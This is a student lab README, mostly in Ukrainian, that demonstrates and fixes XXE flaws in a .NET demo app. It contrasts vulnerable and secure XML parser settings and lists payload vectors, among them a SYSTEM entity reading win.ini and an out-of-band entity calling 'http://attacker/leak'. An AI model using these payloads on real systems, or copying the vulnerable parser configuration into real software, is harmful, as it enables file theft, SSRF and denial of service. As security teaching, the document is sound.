# Module 03: A4: XML External Entities (XXE)

> Practical security guide, attack vector demonstration in Swagger UI, and remediation architecture for TechFix Enterprise (.NET 10).

---

## 1. Теоретичні відомості

Уразливість **OWASP Top 10 A4: XML External Entities (XXE)** виникає у слабко налаштованих XML-парсерах, які підтримують обробку оголошень типів документів (Document Type Definitions, DTD) та зовнішніх сутностей (External Entities):
- **CWE-611 (Information Exposure via XML External Entity):** Використання директиви `SYSTEM` для зчитування файлів сервера (`win.ini`, `/etc/passwd`, web.config).
- **CWE-918 (Server-Side Request Forgery - SSRF через XXE):** Примушування сервера надсилати запити до внутрішніх сервісів локальної мережі (`http://169.254.169.254/` або внутрішні мікросервіси).
- **CWE-776 (Billion Laughs XML Entity Expansion DoS):** Рекурсивне розгортання вкладених сутностей, що експоненційно вичерпує оперативну пам'ять та зависає процес веб-сервера.

---

## 2. Архітектурна реалізація у проєкті TechFix

У проєкті **TechFix Enterprise** модуль XXE реалізовано через контракт `IXxeService`, сервіс `XxeService` та контролер `A4_XxeController`:
- **Уразлива конфігурація:** `XmlReaderSettings` із `DtdProcessing = DtdProcessing.Parse` та `XmlUrlResolver`, що дозволяє резолвінг зовнішніх URL та файлів.
- **Захищена конфігурація (Secure by Design):** `DtdProcessing = DtdProcessing.Prohibit`, `XmlResolver = null`, вимкнення зовнішніх схем.

```csharp
// ❌ ВРАЗЛИВИЙ XML-ПАРСЕР: Дозволяє DTD та резолвінг сутностей
var settings = new XmlReaderSettings
{
    DtdProcessing = DtdProcessing.Parse,
    XmlResolver = new XmlUrlResolver()
};

// ✅ ЗАХИЩЕНИЙ XML-ПАРСЕР: Повна заборона DTD
var safeSettings = new XmlReaderSettings
{
    DtdProcessing = DtdProcessing.Prohibit,
    XmlResolver = null,
    MaxCharactersFromEntities = 0
};
```

---

## 3. Практична демонстрація у Swagger UI

### 3.1. Загальний огляд ендпоінтів A4
![Огляд ендпоінтів A4](./screenshots/01_swagger_a4_overview.png)
*Рис. 1. Ендпоінти тестування XML External Entities у Swagger UI.*

### 3.2. Витік локальних системних файлів (File Leak через SYSTEM Entity)
- **Уразливий парсер (Payload: `<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">`):**  
  ![XXE File Leak Vulnerable](./screenshots/02_swagger_xxe_file_leak_vulnerable.png)
  *Рис. 2. Витік вмісту файлу win.ini сервера у відповіді API.*

- **Захищений парсер:**  
  ![XXE File Leak Secure](./screenshots/03_swagger_xxe_prohibit_secure.png)
  *Рис. 3. Безпечне блокування обробки DTD (XmlException: DTD is prohibited).*

### 3.3. REST Framework XML Content-Type Attack
- **Уразливий ендпоінт:**  
  ![REST XML Vulnerable](./screenshots/04_swagger_xxe_blind_ssrf_vulnerable.png)
  *Рис. 4. Експлуатація небезпечного парсингу через Content-Type: application/xml.*

- **Захищений ендпоінт:**  
  ![REST XML Secure](./screenshots/05_swagger_xxe_blind_ssrf_secure.png)
  *Рис. 5. Захищена валідація схеми без дозволу сутностей.*

### 3.4. Blind OOB SSRF та Billion Laughs Denial of Service
- **Blind SSRF виклик:**  
  ![Blind SSRF](./screenshots/06_swagger_xxe_billion_laughs_vulnerable.png)
  *Рис. 6. Демонстрація генерації стороннього Out-of-band мережевого запиту.*

- **Billion Laughs DoS блокування:**  
  ![Billion Laughs Blocked](./screenshots/07_swagger_xxe_billion_laughs_secure.png)
  *Рис. 7. Запобігання вичерпанню пам'яті через блокування рекурсивних сутностей.*

---

## 4. Зведена таблиця результатів

| Сценарій атаки | CWE | Тестовий вектор | Уразливий стан | Захисний стан |
|---|---|---|---|---|
| **Local File Leak** | CWE-611 | `SYSTEM "file:///C:/win.ini"` | Витік системних файлів ОС | `DtdProcessing.Prohibit` |
| **REST XML Injection** | CWE-611 | `application/xml` тіло | Несанкціоноване читання даних | Сувора DTO-типізація |
| **Blind OOB SSRF** | CWE-918 | `SYSTEM "http://attacker/leak"` | Примусовий виклик мережі | `XmlResolver = null` |
| **Billion Laughs** | CWE-776 | Рекурсивні сутності `&lol9;` | Переповнення пам'яті (DoS) | Ліміт символів, відмова від DTD |

---

## 5. Звіти лабораторної роботи
- **Word:** [`Звіт_ЛР3_Томка_A4_XXE.docx`](file:///C:/OneDrive/ТНТУ%20ПУЛЮЯ/3%20семестр/Технології%20розробки%20захищеного%20програмного%20забезпечення/Лабораторна_робота_3/Звіт_ЛР3_Томка_A4_XXE.docx)
- **PDF:** [`Звіт_ЛР3_Томка_A4_XXE.pdf`](file:///C:/OneDrive/ТНТУ%20ПУЛЮЯ/3%20семестр/Технології%20розробки%20захищеного%20програмного%20забезпечення/Лабораторна_робота_3/Звіт_ЛР3_Томка_A4_XXE.pdf)
